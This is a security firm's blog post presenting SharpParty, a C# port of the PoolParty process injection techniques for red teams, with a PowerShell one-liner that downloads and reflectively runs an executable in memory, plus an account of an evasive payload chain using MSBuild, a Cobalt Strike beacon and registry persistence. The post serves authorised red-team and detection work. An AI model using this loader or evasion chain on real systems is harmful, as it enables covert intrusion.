# https://www.levelblue.com/blogs/spiderlabs-blog/sharpparty-process-injection-in-c

LevelBlue Acquires Fortra’s Alert Logic MDR Business, Strengthening Position as Global MDR Leader. [Learn More](https://levelblue.com/newsroom/press-releases/levelblue-and-fortra-launch-strategic-managed-services-partnership-to-accelerate-cybersecurity-innovation)

- [Government](https://levelblue.com/solutions/government)
- [Contact Us](https://levelblue.com/company/contact)
- Login















[USM Anywhere Login](https://success.alienvault.com/s/)



[Fusion Platform Login](https://fusion.trustwave.com/fusion-auth/#/)







[MailMarshal Cloud Login](https://console.us.mailmarshal.cloud/)

- Incident Response











###### Experiencing a security breach?







Access immediate incident response support, available 24/7






24 HOUR HOTLINES










  - AMERICAS
     [+1 855 438 4305](tel:+18554384305)
  - EMEA
     [+44 8081687370](tel:+448081687370)
  - AUSTRALIA
     [+61 1300901211](tel:+611300901211)
  - SINGAPORE
     [+65 68175019](tel:+6568175019)

[Recommended Actions](https://levelblue.com/company/security-breach)

[![LevelBlue-Logo-reverse](https://www.levelblue.com/hubfs/lb-web/logos/LevelBlue-Logo-reverse.svg)](https://www.levelblue.com/)

[![LevelBlue-Logo-Dark](https://www.levelblue.com/hubfs/lb-web/logos/LevelBlue-Logo-Dark.svg)](https://www.levelblue.com/)

[![LevelBlue-Logo-Dark](https://www.levelblue.com/hubfs/lb-web/logos/LevelBlue-Logo-Dark.svg)](https://www.levelblue.com/)

- Services








Services














Cyber Advisory

















Managed Cloud Security

















Data Security

















Managed Detection & Response

















Email Security

















Managed Network Infrastructure Security

















Exposure Management

















Security Operations Platforms

















Incident Readiness & Response

















SpiderLabs Threat Intelligence












[View All Services](https://www.levelblue.com/services)

- Solutions








Solutions














BY INDUSTRY







  - [Education](https://levelblue.com/solutions/education)
  - [Financial Services](https://levelblue.com/solutions/financial-services)
  - [Government](https://levelblue.com/solutions/government)








    Why LevelBlue










    About Us





    We reduce cyber risk and build resilience













    Awards and Accolades





    The most recognized cybersecurity leader













    LevelBlue SpiderLabs





    Elite global threat experts and intelligence













    PGA of America Partnership





    Cybersecurity at the championship level













    Secure What's Next





    Future-proof your organization













    LevelBlue Security Operations Platforms





    Unprecedented security visibility and control













    Security Colony





    Cybersecurity threat protection resources


  - [Healthcare](https://levelblue.com/solutions/healthcare)








    Partners












    Microsoft





    Unlock the full power of Microsoft Security













    Technology Alliance Partners





    Key alliances who align and support our ecosystem of security offerings














    [Register](https://trustwave.ziftone.com/#/page/reg)







    [Login](https://trustwave.ziftone.com/)

  - [Retail & Hospitality](https://levelblue.com/solutions/retail-and-hospitality)








    Resources










    BLOGS







    - [LevelBlue Blog](https://levelblue.com/blogs/levelblue-blog)
    - [SpiderLabs Blog](https://levelblue.com/blogs/spiderlabs-blog)

UPCOMING


    - [Webinars](https://levelblue.com/upcoming/webinars)
    - [Events](https://levelblue.com/upcoming/events)

MEDIA & ASSETS


    - [Resource Library](https://levelblue.com/resources/?type=show_all&topic=show_all&industry=show_all)
    - [Videos](https://levelblue.com/resources/?type=video&topic=show_all&industry=show_all)
    - [Analyst Reports](https://levelblue.com/resources/?type=analyst_report&topic=show_all&industry=show_all)
    - [Webinar Replays](https://levelblue.com/resources/?type=webinar&topic=show_all&industry=show_all)
    - [Case Studies](https://levelblue.com/resources/?type=case_study&topic=show_all&industry=show_all)
    - [Free Trials](https://levelblue.com/free-trials)

NOTICES


    - [Security Advisories](https://levelblue.com/security-resources/security-advisories)
    - [Software Updates](https://levelblue.com/security-resources/software-updates)

HELP


    - [Contact](https://levelblue.com/company/contact)
    - [Support](https://levelblue.com/company/support)

  - [Legal](https://levelblue.com/solutions/legal)
  - [Manufacturing](https://levelblue.com/solutions/manufacturing)
  - [Technology](https://levelblue.com/solutions/technology)
  - [Energy & Utilities](https://levelblue.com/solutions/energy-and-utilities)

BY REGULATION


  - [Data Privacy](https://levelblue.com/solutions/data-privacy)
  - [CMMC](https://levelblue.com/solutions/cybersecurity-maturity-model-certification-cmmc)
  - [FISMA](https://levelblue.com/solutions/fisma)








    Why LevelBlue










    About Us





    We reduce cyber risk and build resilience













    Awards and Accolades





    The most recognized cybersecurity leader













    LevelBlue SpiderLabs





    Elite global threat experts and intelligence













    PGA of America Partnership





    Cybersecurity at the championship level













    Secure What's Next





    Future-proof your organization













    LevelBlue Security Operations Platforms





    Unprecedented security visibility and control













    Security Colony





    Cybersecurity threat protection resources


  - [GDPR](https://levelblue.com/solutions/gdpr)








    Partners












    Microsoft





    Unlock the full power of Microsoft Security













    Technology Alliance Partners





    Key alliances who align and support our ecosystem of security offerings














    [Register](https://trustwave.ziftone.com/#/page/reg)







    [Login](https://trustwave.ziftone.com/)

  - [GLBA](https://levelblue.com/solutions/glba)








    Resources










    BLOGS







    - [LevelBlue Blog](https://levelblue.com/blogs/levelblue-blog)
    - [SpiderLabs Blog](https://levelblue.com/blogs/spiderlabs-blog)

UPCOMING


    - [Webinars](https://levelblue.com/upcoming/webinars)
    - [Events](https://levelblue.com/upcoming/events)

MEDIA & ASSETS


    - [Resource Library](https://levelblue.com/resources/?type=show_all&topic=show_all&industry=show_all)
    - [Videos](https://levelblue.com/resources/?type=video&topic=show_all&industry=show_all)
    - [Analyst Reports](https://levelblue.com/resources/?type=analyst_report&topic=show_all&industry=show_all)
    - [Webinar Replays](https://levelblue.com/resources/?type=webinar&topic=show_all&industry=show_all)
    - [Case Studies](https://levelblue.com/resources/?type=case_study&topic=show_all&industry=show_all)
    - [Free Trials](https://levelblue.com/free-trials)

NOTICES


    - [Security Advisories](https://levelblue.com/security-resources/security-advisories)
    - [Software Updates](https://levelblue.com/security-resources/software-updates)

HELP


    - [Contact](https://levelblue.com/company/contact)
    - [Support](https://levelblue.com/company/support)

  - [HIPAA](https://levelblue.com/solutions/hipaa)
  - [ISO](https://levelblue.com/solutions/iso)
  - [SOX](https://levelblue.com/solutions/sox)

BY TOPIC


Offensive Security


Solutions to maximize your security ROI


Operational Technology


End-to-end OT security


Microsoft Security


Unlock the full power of Microsoft Security


Securing the IoT Landscape


Test, monitor and secure network objects


- Why LevelBlue








Why LevelBlue










About Us





We reduce cyber risk and build resilience













Awards and Accolades





The most recognized cybersecurity leader













LevelBlue SpiderLabs





Elite global threat experts and intelligence













PGA of America Partnership





Cybersecurity at the championship level













Secure What's Next





Future-proof your organization













LevelBlue Security Operations Platforms





Unprecedented security visibility and control













Security Colony





Cybersecurity threat protection resources


- Partners








Partners












Microsoft





Unlock the full power of Microsoft Security













Technology Alliance Partners





Key alliances who align and support our ecosystem of security offerings














[Register](https://trustwave.ziftone.com/#/page/reg)







[Login](https://trustwave.ziftone.com/)

- Resources








Resources










BLOGS







  - [LevelBlue Blog](https://levelblue.com/blogs/levelblue-blog)
  - [SpiderLabs Blog](https://levelblue.com/blogs/spiderlabs-blog)

UPCOMING


  - [Webinars](https://levelblue.com/upcoming/webinars)
  - [Events](https://levelblue.com/upcoming/events)

MEDIA & ASSETS


  - [Resource Library](https://levelblue.com/resources/?type=show_all&topic=show_all&industry=show_all)
  - [Videos](https://levelblue.com/resources/?type=video&topic=show_all&industry=show_all)
  - [Analyst Reports](https://levelblue.com/resources/?type=analyst_report&topic=show_all&industry=show_all)
  - [Webinar Replays](https://levelblue.com/resources/?type=webinar&topic=show_all&industry=show_all)
  - [Case Studies](https://levelblue.com/resources/?type=case_study&topic=show_all&industry=show_all)
  - [Free Trials](https://levelblue.com/free-trials)

NOTICES


  - [Security Advisories](https://levelblue.com/security-resources/security-advisories)
  - [Software Updates](https://levelblue.com/security-resources/software-updates)

HELP


  - [Contact](https://levelblue.com/company/contact)
  - [Support](https://levelblue.com/company/support)

- Incident Response



Incident Response











###### Experiencing a security breach?







Access immediate incident response support, available 24/7






24 HOUR HOTLINES










  - AMERICAS
     [+1 855 438 4305](tel:+18554384305)
  - EMEA
     [+44 8081687370](tel:+448081687370)
  - AUSTRALIA
     [+61 1300901211](tel:+611300901211)
  - SINGAPORE
     [+65 68175019](tel:+6568175019)

[Recommended Actions](https://levelblue.com/company/security-breach)

- [Submit RFP](https://levelblue.com/submit-rfp)
- [Government](https://levelblue.com/solutions/government)
- [Contact Us](https://levelblue.com/company/contact)
- Login



login













[USM Anywhere Login](https://success.alienvault.com/s/)



[Fusion Platform Login](https://fusion.trustwave.com/fusion-auth/#/)







[MailMarshal Cloud Login](https://console.us.mailmarshal.cloud/)

- [Request a Demo](https://www.levelblue.com/blogs/spiderlabs-blog/sharpparty-process-injection-in-c#navdemo-form)


LevelBlue Acquires Fortra’s Alert Logic MDR Business, Strengthening Position as Global MDR Leader. [Learn More](https://levelblue.com/newsroom/press-releases/levelblue-and-fortra-launch-strategic-managed-services-partnership-to-accelerate-cybersecurity-innovation)

[Submit RFP](https://levelblue.com/submit-rfp)

[Request a Demo](https://www.levelblue.com/blogs/spiderlabs-blog/sharpparty-process-injection-in-c#navdemo-form)

## Request a Demo

First Name\*

Last Name\*

Company Name\*

Business Email\*

Country\*

Please SelectUnited StatesUnited KingdomAustraliaGermanyMexicoNew ZealandSingaporeOtherAfghanistanÅland IslandsAlbaniaAlgeriaAmerican SamoaAndorraAngolaAnguillaAntarcticaAntigua and BarbudaArgentinaArmeniaArubaAsia/Pacific RegionAustriaAzerbaijanBahamasBahrainBangladeshBarbadosBelarusBelgiumBelizeBeninBermudaBhutanBoliviaBosnia and HerzegovinaBotswanaBouvet IslandBrazilBritish Indian Ocean TerritoryBritish Virgin IslandsBruneiBulgariaBurkina FasoBurundiCambodiaCameroonCanadaCape VerdeCaribbean NetherlandsCayman IslandsCentral African RepublicChadChileChinaChristmas IslandCocos (Keeling) IslandsColombiaComorosCongoCook IslandsCosta RicaCote d'IvoireCroatiaCubaCuraçaoCyprusCzech RepublicDemocratic Republic of the CongoDenmarkDjiboutiDominicaDominican RepublicEast TimorEcuadorEgyptEl SalvadorEquatorial GuineaEritreaEstoniaEthiopiaEuropeFalkland IslandsFaroe IslandsFijiFinlandFranceFrench GuianaFrench PolynesiaFrench Southern and Antarctic LandsGabonGambiaGeorgiaGhanaGibraltarGreeceGreenlandGrenadaGuadeloupeGuamGuatemalaGuernseyGuineaGuinea-BissauGuyanaHaitiHeard Island and McDonald IslandsHondurasHong KongHungaryIcelandIndiaIndonesiaIranIraqIrelandIsle of ManIsraelItalyJamaicaJapanJerseyJordanKazakhstanKenyaKiribatiKosovoKuwaitKyrgyzstanLaosLatviaLebanonLesothoLiberiaLibyaLiechtensteinLithuaniaLuxembourgMacauMacedonia (FYROM)MadagascarMalawiMalaysiaMaldivesMaliMaltaMarshall IslandsMartiniqueMauritaniaMauritiusMayotteMicronesiaMoldovaMonacoMongoliaMontenegroMontserratMoroccoMozambiqueMyanmar (Burma)NamibiaNauruNepalNetherlandsNetherlands AntillesNew CaledoniaNicaraguaNigerNigeriaNiueNorfolk IslandNorth KoreaNorthern Mariana IslandsNorwayOmanPakistanPalauPalestinePanamaPapua New GuineaParaguayPeruPhilippinesPitcairn IslandsPolandPortugalPuerto RicoQatarRéunionRomaniaRussiaRwandaSaint BarthélemySaint HelenaSaint Kitts and NevisSaint LuciaSaint MartinSaint Pierre and MiquelonSaint Vincent and the GrenadinesSamoaSan MarinoSao Tome and PrincipeSaudi ArabiaSenegalSerbiaSeychellesSierra LeoneSint MaartenSlovakiaSloveniaSolomon IslandsSomaliaSouth AfricaSouth Georgia and the South Sandwich IslandsSouth KoreaSouth SudanSpainSri LankaSudanSurinameSvalbard and Jan MayenSwazilandSwedenSwitzerlandSyriaTaiwanTajikistanTanzaniaThailandTogoTokelauTongaTrinidad and TobagoTunisiaTurkeyTurkmenistanTurks and Caicos IslandsTuvaluU.S. Virgin IslandsUgandaUkraineUnited Arab EmiratesUnited States Minor Outlying IslandsUruguayUzbekistanVanuatuVatican CityVenezuelaVietnamWallis and FutunaWestern SaharaYemenZambiaZimbabwe

Device

- I agree to receive other communications from LevelBlue.


By clicking submit below, you agree to our [Terms of Use](https://www.levelblue.com/legal/website-terms-of-use) and [Privacy Policy](https://www.levelblue.com/legal/privacy-policy). Additionally, you consent to allow LevelBlue to store and process the personal information submitted above to provide you with the content requested.

Services

Cyber Advisory


Managed Cloud Security


Data Security


Managed Detection & Response


Email Security


Managed Network Infrastructure Security


Exposure Management


Security Operations Platforms


Incident Readiness & Response


SpiderLabs Threat Intelligence


[View All Services](https://www.levelblue.com/services)

Solutions

BY INDUSTRY


- [Education](https://levelblue.com/solutions/education)
- [Financial Services](https://levelblue.com/solutions/financial-services)
- [Government](https://levelblue.com/solutions/government)
- [Healthcare](https://levelblue.com/solutions/healthcare)
- [Retail & Hospitality](https://levelblue.com/solutions/retail-and-hospitality)
- [Legal](https://levelblue.com/solutions/legal)
- [Manufacturing](https://levelblue.com/solutions/manufacturing)
- [Technology](https://levelblue.com/solutions/technology)
- [Energy & Utilities](https://levelblue.com/solutions/energy-and-utilities)

BY REGULATION


- [Data Privacy](https://levelblue.com/solutions/data-privacy)
- [CMMC](https://levelblue.com/solutions/cybersecurity-maturity-model-certification-cmmc)
- [FISMA](https://levelblue.com/solutions/fisma)
- [GDPR](https://levelblue.com/solutions/gdpr)
- [GLBA](https://levelblue.com/solutions/glba)
- [HIPAA](https://levelblue.com/solutions/hipaa)
- [ISO](https://levelblue.com/solutions/iso)
- [SOX](https://levelblue.com/solutions/sox)

BY TOPIC


Offensive Security


Solutions to maximize your security ROI


Operational Technology


End-to-end OT security


Microsoft Security


Unlock the full power of Microsoft Security


Securing the IoT Landscape


Test, monitor and secure network objects


Why LevelBlue

About Us


We reduce cyber risk and build resilience


Awards and Accolades


The most recognized cybersecurity leader


LevelBlue SpiderLabs


Elite global threat experts and intelligence


PGA of America Partnership


Cybersecurity at the championship level


Secure What's Next


Future-proof your organization


LevelBlue Security Operations Platforms


Unprecedented security visibility and control


Security Colony


Cybersecurity threat protection resources


Partners

Microsoft


Unlock the full power of Microsoft Security


Technology Alliance Partners


Key alliances who align and support our ecosystem of security offerings


[Register](https://trustwave.ziftone.com/#/page/reg)

[Login](https://trustwave.ziftone.com/)

Resources

BLOGS


- [LevelBlue Blog](https://levelblue.com/blogs/levelblue-blog)
- [SpiderLabs Blog](https://levelblue.com/blogs/spiderlabs-blog)

UPCOMING


- [Webinars](https://levelblue.com/upcoming/webinars)
- [Events](https://levelblue.com/upcoming/events)

MEDIA & ASSETS


- [Resource Library](https://levelblue.com/resources/?type=show_all&topic=show_all&industry=show_all)
- [Videos](https://levelblue.com/resources/?type=video&topic=show_all&industry=show_all)
- [Analyst Reports](https://levelblue.com/resources/?type=analyst_report&topic=show_all&industry=show_all)
- [Webinar Replays](https://levelblue.com/resources/?type=webinar&topic=show_all&industry=show_all)
- [Case Studies](https://levelblue.com/resources/?type=case_study&topic=show_all&industry=show_all)
- [Free Trials](https://levelblue.com/free-trials)

NOTICES


- [Security Advisories](https://levelblue.com/security-resources/security-advisories)
- [Software Updates](https://levelblue.com/security-resources/software-updates)

HELP


- [Contact](https://levelblue.com/company/contact)
- [Support](https://levelblue.com/company/support)

# SharpParty: Process Injection in C\#

[Change theme to light](https://www.levelblue.com/blogs/spiderlabs-blog/sharpparty-process-injection-in-c#)

November 11, 20254 Minute Readby Will Rabb

This article also appears on the [Stroz Friedberg](https://levelblue.com/blogs/security-essentials/sharpparty), A LevelBlue Company, blog site.

As Anti-Virus and EDR solutions improve in detection and response capabilities, the job of a red teamer can become quite arduous. Malware payloads and techniques that once dominated networks have failed the test of time as EDR becomes aware of them. If your initial access payloads are detected immediately, your six-week long red team could be dead on arrival. Additionally, real-world threat actors have an abundance of time and resources; just imagine all the payloads, techniques, and 0-days that a sophisticated threat actor group may have developed over the years. It is essential for red teams to continuously develop their tactics, techniques, and procedures (TTPs) for the purpose of emulating real-life threat actors that are ever evolving.

In this blog post, Stroz Friedberg, a LevelBlue company, introduces an addition to the red teamers’ toolkit called “SharpParty” – a C# implementation of the process injection techniques dubbed “PoolParty”.

We want to be very clear here: Stroz Friedberg did not create [PoolParty](https://github.com/SafeBreach-Labs/PoolParty) nor did Stroz Friedberg extend the research into Windows Thread Pools. Rather, Stroz Friedberg simply translated the original source code of SafeBreach Labs from C++ to C#. The goal here is to give red teamers more options when picking their payloads. You can download SharpParty from our [GitHub repository](https://github.com/strozfriedberg/SharpParty).

### Process Injection

Before we dive into PoolParty, we must understand what process injection is first. Process injection is a relatively simple concept: inject code into another process. The purpose of injecting code into another process is to hide and obscure malicious activities. The actual implementation of process injection, however, is not as simple.

If you would like to learn more about process injection, please refer to the following URLs:

- [https://attack.mitre.org/techniques/T1055/](https://attack.mitre.org/techniques/T1055/)
- [https://github.com/plackyhacker/Shellcode-Injection-Techniques](https://github.com/plackyhacker/Shellcode-Injection-Techniques)

### PoolParty

SafeBreach Labs masterfully exemplified the necessity of continuous TTP development through the release of “PoolParty” – a suite of process injection techniques that target Windows Thread Pools. With this research, SafeBreach Labs was able to bypass five of the leading EDR vendors. They also released a [Proof-of-Concept GitHub repository](https://github.com/SafeBreach-Labs/PoolParty), with source code written in C++.

In short, PoolParty injects code into processes by crafting and inserting legitimate work items into a process’s thread pool. A work item is a structure that contains a task specification, including specific conditions and code to execute when these conditions are met. Injected work items effectively act as the execution primitive, because the work item will execute our code when its conditions are met. For example, a work item can perform an action when a file is modified. The file modification in this example is the execution primitive and we do not have to manually start the execution via something like “CreateRemoteThread”, which is a well-known indicator of process injection.

#### Secure your expanding attack surface with Trustwave Penetration Testing.

[Learn More](https://www.trustwave.com/en-us/services/penetration-testing/)

### Motivation

The primary motivation for a C# implementation is to allow the PoolParty techniques to be used in tools that leverage inline MSBuild tasks in XML files. A Task XML file can include embedded C# code that, when passed to “msbuild.exe”, will be compiled and executed. While Task XMLs do support C++ (the language the original PoC was written in), they are only supported when the “CppCodeProvider.dll” assembly is present on the target machine. This DLL is included within some Visual Studio installations and is not guaranteed to be present on Windows machines by default. To ensure our payloads would detonate on practically any Windows host, we would need to implement the PoolParty technique in C#.

Additionally, a C# implementation of PoolParty can be reflectively loaded into memory via PowerShell:

`$data = (new-object net.webclient).downloaddata(‘http://127.0.0.1/sharpparty.exe’);

``$assem = [System.Reflection.Assembly]::Load($data);

``[SharpParty.Program]::Main(“1 666”.Split());`

Lastly, as offensive C# tooling continues to grow in popularity, a C# PoolParty implementation can be integrated into other offensive tooling as part of varying attack chains.

For these reasons, Stroz Friedberg began implementation of the “PoolParty” technique in C# – SharpParty.

### Efficacy Against EDR

During our testing, SharpParty was consistently able to bypass Microsoft Defender for Endpoint (MDE) initially. We submitted a report to Microsoft that demonstrated the bypass in March of 2025, which they validated and subsequently implemented detections for. Since then, we have observed an increase in the number of detections on SharpParty. Other EDR systems have detected and sometimes prevented the execution of SharpParty, largely based on the malicious use of “msbuild.exe” as well as an unspecified process injection technique.

While SharpParty inline tasks have seen increased detections from EDR recently, there are a few things worth noting:

- SafeBreach Labs publicly released their research on process injection via Windows Thread Pools, enabling EDR vendors to implement detections and monitoring for this technique.
- The use of inline tasks and “msbuild.exe” is a relatively well-known technique.
- There is room for further development that could improve the payload’s efficacy against EDR.

Ultimately our goal is to give red teams one more item in their toolkit, one more means to meet an end, another test case that evaluates threat detection capabilities.

### Success Story

During our research, we had the opportunity to further test our code on a client engagement. The following is a breakdown of our payload:

- A Task XML file with C# inline task that contains encrypted SharpParty code and helper functions to fetch the decryption key, decrypt the code, then compile and execute the decrypted code.
- The beacon shellcode is nested within an additional layer of encryption.
- HTTP Keying is used to retrieve and validate the decryption key, ensuring connectivity to the C2 server.

The execution flow of the payload is depicted in the diagram below:

![Diagram](https://www.levelblue.com/hs-fs/hubfs/Imported_Blog_Media/Diagram.jpg?width=624&height=173&name=Diagram.jpg)

_Figure 1. Payload execution flow diagram._

How the dropper executes “msbuild.exe” on the task XML is dependent on various conditions and is outside the scope of this blog post.

With everything tested and ready to go, we joined a call with the client to screenshare the malware detonation. We disguised the payload in such a way that, from the victim’s perspective, it looks like they downloaded a ZIP file and opened a PDF. Under the hood, we successfully executed SharpParty and obtained a Cobalt Strike beacon. After establishing the C2 channel, the client received no alarms on their side at that moment. After about 10 minutes, we suggested a test-case involving persistence via registry run keys to check if this activity is detected. The client agreed, and we performed the test case live on the call, setting an autorun key to execute the same SharpParty payload. Then, we logged out of the workstation, logged back in, and received the second beacon.

The client was understandably concerned, seeing as we had established two C2 beacons and they had not received any detections. 30 minutes after detonation, the EDR picked up the malicious use of “msbuild.exe” and an unspecified malicious payload in our target process, for which the client was alerted.

While ultimately this code was still caught, there are two key takeaways:

- The execution of “msbuild.exe” is what was picked up by EDR.
- There are 30 minutes between detonation and detection. While relatively small, this gap may be large enough for a threat actor to pivot within the network and maintain their access.

### Conclusion

In summary, we have developed a C# implementation of PoolParty based on the incredible work from SafeBreach Labs, provided motivation for its existence, and shared a success story. As always, there is room for improvement. We have room to grow in terms of adding more variants, perhaps even discovering new ones, and improving the efficacy against EDR products. Our goal in publishing this blog post and open sourcing SharpParty is to share knowledge with the security community and provide avenues for future research and development.

#### About the Author

Will Rabb is Technical Manager, Security Testing, Stroz Friedberg, a LevelBlue Company.

#### ABOUT LEVELBLUE

LevelBlue is a globally recognized cybersecurity leader that reduces cyber risk and fortifies organizations against disruptive and damaging cyber threats. Our comprehensive offensive and defensive cybersecurity portfolio detects what others cannot, responds with greater speed and effectiveness, optimizes client investment, and improves security resilience. Learn more [about us](https://levelblue.com/company/about-us/).

[Tips & Tricks](https://www.levelblue.com/blogs/spiderlabs-blog/tag/tips-tricks) [Penetration Testing](https://www.levelblue.com/blogs/spiderlabs-blog/tag/penetration-testing)

## Latest Intelligence

[Pwning Malware with Ninjas and Unicorns](https://www.levelblue.com/blogs/spiderlabs-blog/pwning-malware-with-ninjas-and-unicorns)

[How ClickFix Opens the Door to Stealthy StealC Information Stealer](https://www.levelblue.com/blogs/spiderlabs-blog/how-clickfix-opens-the-door-to-stealthy-stealc-information-stealer)

[Stealerium Unmasked: Inside a Multi-Lure, Multi-Stage Stealer Campaign](https://www.levelblue.com/blogs/spiderlabs-blog/stealerium-unmasked-inside-a-multi-lure-multi-stage-stealer-campaign)

### Related Offerings

[Penetration Testing](https://levelblue.com/services/penetration-testing/) [Incident Readiness and Response](https://levelblue.com/services/incident-readiness-and-response/) [Cyber Threat Intelligence](https://levelblue.com/services/cyber-threat-intelligence/) [Threat Hunting](https://levelblue.com/services/threat-hunting/)

#### Discover how our specialists can tailor a security program to fit the needs of   your organization.

[Request a Demo](https://www.levelblue.com/blogs/spiderlabs-blog/sharpparty-process-injection-in-c#popupBlog)

## Stay Informed

##### Sign up to receive the latest security news and trends straight to your inbox from LevelBlue.

- [Leadership](https://levelblue.com/company/leadership/)
- [Our History](https://levelblue.com/company/our-history/)
- [Press Releases](https://levelblue.com/newsroom/press-releases/)
- [Media Coverage](https://levelblue.com/newsroom/media-coverage/)

- [Careers](https://levelblue.com/company/careers/)
- [Contact](https://levelblue.com/company/contact/)
- [View All Services](https://www.levelblue.com/services)
- [Free Trials](https://levelblue.com/free-trials/)

- [Training & Certification](https://levelblue.com/training-and-certification/)
- [Support](https://levelblue.com/company/support/)
- [Success Center](https://success.alienvault.com/s/)
- [Documentation Center](https://docs.levelblue.com/documentation)

- [Legal](https://levelblue.com/legal/)
- [Terms of Usage](https://levelblue.com/legal/website-terms-of-use/)
- [Privacy Policy](https://levelblue.com/legal/privacy-policy/)
- [Your Privacy Choices](https://levelblue.com/legal/choices-and-controls/)

© Copyright 2026

Twitter Widget Iframe